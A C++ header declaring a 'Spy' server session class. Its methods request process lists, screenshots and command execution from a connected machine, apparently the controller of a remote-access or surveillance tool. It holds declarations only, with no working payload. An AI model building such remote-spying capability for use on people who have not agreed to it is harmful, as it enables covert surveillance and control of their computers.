#ifndef _SERVER_SPY
#define _SERVER_SPY

#include <iostream>
#include <map>
#include <thread>
#include <cstdlib>

#include "../Net.hh"
#include "MsgBox.hh"
#include "Process.hh"
#include "ScreenShot.hh"
#include "Cmd.hh"
#include "../Controller/spy.hh"
#include "proto.hh"
#include "server.hh"

namespace Spy {
    class session_on_spy : public Serv_session {
    public:
	session_on_spy(int socket);
	
	void on_begin();
	void do_retour(std::string);
	void do_info(std::string);
	void do_warning(std::string);
	void do_get_list_proc(std::string);
	void do_get_screenshot(std::string);
	void do_get_big_screenshot(std::string);
	void do_send_cmd(std::string);
	void do_add_proc(std::string);

    private:
	std::string m_name, m_ip;
	int         m_port;
	bool        auth;
	unsigned long m_content;
    };

    int CURRENT_PORT;
    std::map<Spy::session_on_spy*, std::vector<std::string> > map_sessions;

    void init_cont_session(int argc, char** argv);
    void thread_spy_proc();
};

#endif
